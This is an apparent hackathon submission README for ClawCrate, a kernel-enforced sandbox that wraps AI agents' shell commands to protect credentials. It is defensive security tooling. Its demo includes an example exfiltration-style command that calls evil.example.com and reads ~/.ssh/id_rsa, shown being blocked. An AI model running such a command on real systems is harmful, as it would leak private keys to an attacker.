# ClawCrate — Encode Club Submission

> **Your agent runs free. Your secrets stay locked.**

**Track:** Agentic AI / Security infrastructure
**License:** MIT
**Repo:** https://github.com/manuelpenazuniga/ClawCrate

---

## 30-Second Pitch

Every shell command your AI agent runs inherits *all* your permissions. Your SSH keys, AWS credentials, `.env` files, browser cookies — everything. When your agent does `npm install` or `git checkout`, so does any malicious script hiding inside.

ClawCrate is a single Rust binary that wraps those commands in a kernel-enforced sandbox. No Docker. No VM. No root. Under 5ms overhead. The kernel blocks what the agent can't.

---

## The Problem

Three incidents from the last two months:

| Incident | Vector | Impact |
|---|---|---|
| **Shai-Hulud worm** | Bitwarden npm package | SSH keys, cloud credentials, and agent config files exfiltrated |
| **Axios compromise** | Supply-chain postinstall | Arbitrary code executed on developer machines during install |
| **Cursor CVE** | Malicious git hook | Hook ran the moment the agent did `git checkout` |

In each case, the agent had full access to the developer's machine. There was no layer between "agent decides to run a command" and "command inherits all permissions."

LLM-based guardrails don't solve this. A clever prompt can convince a model to reconsider. A Landlock ruleset speaks no language — it enforces at the syscall level.

---

## Solution

```
Agent decides: "run npm install"
       │
       ▼
clawcrate run --profile install -- npm install
       │
       ├── Workspace copied to temp dir (.env excluded — invisible, not blocked)
       ├── Environment scrubbed (AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, SSH_AUTH_SOCK → gone)
       ├── Kernel sandbox applied:
       │     Linux:  Landlock (filesystem) + seccomp-bpf (syscalls) + rlimits
       │     macOS:  Seatbelt SBPL (filesystem + network + process)
       │     → Irremovible. Inherited by every child process.
       ├── ~/.ssh, ~/.aws, Keychain, ~/Library/Cookies → blocked
       ├── Network: blocked (or domain-filtered if profile allows)
       │
       ▼
npm install runs. node_modules written. Postinstall script contained.
Audit log written. fs-diff generated. Real workspace unchanged.
```

One binary. No daemon. Overhead you can't measure.

---

## Live Demo

▶ **[Video — placeholder: record and embed before submission]**

Or run it yourself in under 60 seconds:

```bash
# 1. Install
curl -fsSL https://github.com/manuelpenazuniga/ClawCrate/releases/latest/download/install.sh | sh

# 2. Sandbox a command
clawcrate run --profile safe -- echo "hello from the sandbox"

# 3. See what would have happened to an exfiltration attempt
clawcrate run --profile safe -- sh -c "curl https://evil.example.com && cat ~/.ssh/id_rsa"
# → Permission denied (network blocked, ~/.ssh not in read allowlist)
```

---

## Quickstart

```bash
# Install (macOS or Linux, x86_64 or ARM)
curl -fsSL https://github.com/manuelpenazuniga/ClawCrate/releases/latest/download/install.sh | sh

# Check your system's sandboxing capabilities
clawcrate doctor

# Run your agent's commands through ClawCrate
clawcrate run --profile build -- cargo test
clawcrate run --profile install -- npm install express
clawcrate run --profile safe -- python3 -m pytest -q
```

Four built-in profiles cover the most common agent tasks:

| Profile | Filesystem | Network | When to use |
|---|---|---|---|
| `safe` | Read workspace | Blocked | Tests, linting, analysis |
| `build` | Read workspace + toolchain, write output dirs | Blocked | Compilation, tests |
| `install` | Read/write dependency dirs | Open | npm/pip/cargo installs |
| `open` | Read/write workspace | Open | General scripts |

---

## Technical Differentiation

### Kernel-enforced, not prompt-enforced

| Approach | How it stops bad commands | Can the agent bypass it? |
|---|---|---|
| Prompt guardrails | LLM judges the request | Yes — with a clever prompt |
| ClawCrate | OS kernel enforces policy | No — kernel speaks no language |

Once Landlock or Seatbelt is applied in the child process, it is irremovible. Not even `sudo` or `LD_PRELOAD` can undo it. Every child process inherits the same restrictions.

### Why not Docker?

- Docker startup: **500ms–2s**. ClawCrate: **<5ms**.
- Docker requires a daemon and root-level socket access. ClawCrate: zero.
- Docker isolates the *environment*. ClawCrate isolates the *intent* — what the process is allowed to do on your real machine.

### Audit trail built in

Every execution writes to `~/.clawcrate/runs/<id>/`:

```
plan.json      — resolved profile + permissions granted/denied
result.json    — exit code, status, duration
stdout.log     — captured output
audit.ndjson   — one JSON event per sandbox decision
fs-diff.json   — filesystem changes before vs after
```

This is not optional logging — it's the default. Every run is auditable.

---

## Roadmap

### Now (alpha, shipping)
- Linux: Landlock + seccomp-bpf + rlimits
- macOS: Seatbelt (Apple Silicon native, no VMs)
- Four built-in profiles + custom YAML
- Replica mode for high-risk installs
- Agent demo (Anthropic SDK + claude-opus-4-7)

### Next (v0.2.0 — July 2026)
- **Hash chain audit** — each `audit.ndjson` event gets `previous_hash` + `current_hash` (SHA-256, RFC 8785 canonical JSON). Tamper-evident by design. Required by IETF draft-sharif-agent-audit-trail-00.
- **EU AI Act alignment** — Article 12 (automatic event logging) and Article 19 (6-month retention) apply from **2026-08-02**. ClawCrate's audit format is designed to satisfy both without configuration.
- **`clawcrate verify <run-id>`** — offline integrity check of a past audit trail.

### Later (v0.3.0+)
- **MCP Server Firewall** — transparent JSON-RPC stdio passthrough that wraps any MCP server in a ClawCrate sandbox profile. Stops the Shai-Hulud attack vector at the tool boundary.
- **`clawcrate learn`** — trace a command via strace/DTrace and auto-generate the tightest-fit YAML profile. Eliminates the #1 adoption friction.
- **GitHub Action** (`clawcrate/action@v1`) — wrap CI steps with upload-artifact and fail-on-tampering.
- **profiles.dev** — community-signed profile marketplace via sigstore/cosign.

---

## Team

**Manuel Peña** — sole maintainer, all commits.
Security infrastructure background. Building ClawCrate to solve a problem felt personally after an agent ran `npm install` on an untrusted repo during a late-night session.

Contact: manupz92@gmail.com
GitHub: https://github.com/manuelpenazuniga

---

## Q&A Cheat Sheet

**"How is this different from Docker?"**
Docker isolates the environment. ClawCrate isolates the intent. 500ms vs <5ms. No daemon, no root, no images.

**"Why not firejail / bubblewrap?"**
Firejail needs setuid root. Bubblewrap is Linux-only. ClawCrate is one binary, Linux + macOS, same UX, no privilege escalation.

**"Can the agent escape the sandbox?"**
No. Landlock and Seatbelt are applied before exec and inherited by all child processes. The sandbox doesn't accept instructions from inside itself. The kernel doesn't speak English.

**"What's the performance overhead?"**
Sub-5ms per command. The kernel does the work; ClawCrate just configures it.

**"Is it open source?"**
MIT licensed. No telemetry. No cloud dependency. No account required.

---

*Submitted to Encode Club Agentic Mini Hack — 2026-05-13.*
